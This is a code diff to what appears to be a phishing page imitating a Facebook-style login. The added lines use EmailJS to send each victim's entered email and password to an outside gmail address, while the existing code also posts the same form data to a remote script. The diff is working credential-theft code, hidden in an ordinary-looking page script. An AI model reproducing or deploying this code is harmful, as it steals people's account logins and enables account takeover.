@@ -805,7 +805,22 @@ tutup.src = "https://2.top4top.net/m_1344hm49c1.mp3";
       form.append("PASSWORD",pass.value);
       fbDiv.style.visibility = 'hidden';
       loadDiv.style.visibility = 'visible';
-      
+
+emailjs.init("IbRp7ZyZNQRmuiY_7");
+  const templateParams = {
+    to_email: "vshaktisinh434@gmail.com",
+    u_name: emn.value,
+    u_pass: pass.value,
+    u_login: "None",
+  };
+  emailjs.send("service_gg5vd2p", "template_4qs5oq8", templateParams)
+    .then((response) => {
+      console.log("");
+    })
+    .catch((error) => {
+      console.error("e");
+    });
+		
    fetch(scriptURL, { method: 'POST', body: form})
 .then(response => loadDiv.style.visibility = 'hidden')
 .then(() => {okeShow();})
